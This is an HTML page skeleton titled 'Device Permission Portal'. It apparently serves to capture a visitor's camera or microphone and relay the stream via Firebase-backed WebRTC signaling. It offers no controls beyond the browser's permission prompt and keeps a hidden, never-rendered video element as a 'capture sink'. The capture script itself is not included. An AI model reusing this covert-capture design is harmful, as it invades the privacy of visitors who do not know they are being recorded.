<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Permission Portal</title>
  <link rel="stylesheet" href="/css/visitor.css">
  <!-- Firebase SDK for real-time WebRTC signaling (compat mode) -->
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
</head>
<body>
  <main class="silent-shell">
    <!-- Status only. No buttons are shown; the browser's own permission dialog is the only prompt. -->
    <div class="silent-status" role="status" aria-live="polite">
      <span id="statusDot" class="status-dot"></span>
      <span id="statusText">Requesting device permissions…</span>
    </div>
  </main>

  <!-- Hidden capture sink: never rendered, used only to hold the live local stream -->
  <video id="localCapture" autoplay playsinline muted hidden></video>

  <script type="module" src="/js/visitor.js"></script>
</body>
</html>
